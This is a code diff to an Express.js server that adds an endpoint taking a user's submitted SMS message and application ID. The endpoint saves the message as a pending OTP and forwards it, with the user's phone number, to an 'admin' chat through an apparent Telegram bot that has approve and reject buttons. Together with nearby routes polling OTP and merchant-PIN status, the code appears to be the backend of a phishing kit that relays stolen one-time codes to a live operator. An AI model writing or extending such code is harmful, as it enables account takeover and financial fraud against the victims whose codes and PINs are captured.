@@ -1689,6 +1689,63 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
     }
 });
 
+// POST /api/verify-sms
+// User submits SMS message for admin verification
+app.post('/api/verify-sms', async (req, res) => {
+    console.log('\n📨 /api/verify-sms called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, smsMessage } = req.body;
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        // Re-add admin to map if needed
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) {
+                adminChatIds.set(admin.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        // Update application with SMS message
+        await db.updateApplication(applicationId, { smsMessage, otpStatus: 'pending' });
+        console.log(`✅ SMS message saved for ${applicationId}`);
+
+        // Send to admin for verification
+        await sendToAdmin(application.adminId, `
+📨 *SMS MESSAGE VERIFICATION*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+⏰ ${new Date().toLocaleString()}
+
+📝 *Message:*
+\`\`\`
+${smsMessage}
+\`\`\`
+
+⚠️ *IS THIS MESSAGE CORRECT?*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Invalid Message',   callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        res.json({ success: true, message: 'SMS submitted for verification' });
+    } catch (error) {
+        console.error('❌ Error in /api/verify-sms:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
 // GET /api/check-merchant-pin-status/:applicationId
 app.get('/api/check-merchant-pin-status/:applicationId', async (req, res) => {
     try {
